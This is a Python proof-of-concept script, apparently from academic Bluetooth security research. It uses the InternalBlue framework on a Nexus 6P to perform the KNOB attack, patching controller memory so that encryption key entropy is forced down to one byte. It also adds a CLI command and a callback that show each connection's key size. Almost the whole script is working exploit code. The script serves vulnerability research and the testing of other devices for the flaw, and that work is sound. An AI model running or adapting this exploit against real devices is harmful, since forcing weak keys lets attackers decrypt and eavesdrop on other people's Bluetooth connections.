#!/usr/bin/python2

# Jiska Classen, Secure Mobile Networking Lab


from pwn import *
from internalblue.adbcore import ADBCore
import internalblue.cli as cli
import internalblue.cmds as cmd
import internalblue.hci as hci
from internalblue.cmds import auto_int


"""
This is a standalone PoC for the KNOB attack on a Nexus 6P.

Original LMP monitor mode was from Dennis Mantz, and was then modified by Daniele Antonioli for KNOB.
For details see https://github.com/francozappa/knob

This PoC is much shorter since it only modifies global variables for key entropy.

"""


internalblue = ADBCore(serial=False)  # without custom bluetooth.default.so, change to True
internalblue.interface = internalblue.device_list()[0][1]  # just use the first device

# setup sockets
if not internalblue.connect():
    log.critical("No connection to target device.")
    exit(-1)


log.info("Installing patch which ensures that send_LMP_encryption_key_size_req is always len=1!")

# modify function lm_SendLmpEncryptKeySizeReq
#patch = asm("mov r2, #0x1", vma=0x4BC6E)  # connection struct key entropy
#internalblue.patchRom(0x4BC6E, patch)
# this somehow crashes on the Nexus 6P, but the global variable seems to be sufficient :)

# modify global variable for own setting
internalblue.writeMem(0x204147, '\x01')  # global key entropy


log.info("-----------------------KNOB-----------------------\n"
         "Installed KNOB PoC. If connections to other devices succeed, they are vulnerable to KNOB.\n"
         "To monitor device behavior, continue on the CLI, ideally with diagnostic LMP mode.\n"
         "On Android, this requires a modified bluetooth.default.so.\n"
         "-----------------------KNOB-----------------------\n"
         "Automatically continuing on KNOB interface...\n"
         "Use the 'knob' command to *debug* the attack, i.e.:\n"
         "    knob --hnd 0x0b\n"
         "...shows the key size of handle 0x000b.\n")


class CmdKnob(cmd.Cmd):
    """
    Introduce a new CLI command to make KNOB debugging easier...
    """
    keywords = ["knob"]
    description = "Debugs which key length is currently active within a connection handle."

    parser = cmd.argparse.ArgumentParser(prog=keywords[0], description=description)

    parser.add_argument("--hnd", type=auto_int, default=0x000c,
                        help="Handle KNOB connection.")

    def work(self):
        args = self.getArgs()
        internalblue.sendHciCommand(0x1408, p16(args.hnd))
        return True


def hciKnobCallback(record):
    """
    Adds a new callback function so that we do not need to call Wireshark.
    """
    hcipkt = record[0]
    if not issubclass(hcipkt.__class__, hci.HCI_Event):
        return

    if hcipkt.event_code == 0x0e:
        if u16(hcipkt.data[1:3]) == 0x1408:  # Read Encryption Key Size
            if u8(hcipkt.data[3]) == 0x12:       # Error
                log.info("No key size available.\n"
                         " - Did you already negotiate an encrypted connection?\n"
                         " - Did you choose the correct connection handle?\n")
            else:
                log.info("HCI_Read_Encryption_Key_Size result for handle 0x%x: %x" % (u16(hcipkt.data[4:6]), u8(hcipkt.data[6])))

    return


# add our command
cmd.CmdKnob = CmdKnob
internalblue.registerHciCallback(hciKnobCallback)


# enter CLI
cli.commandLoop(internalblue)
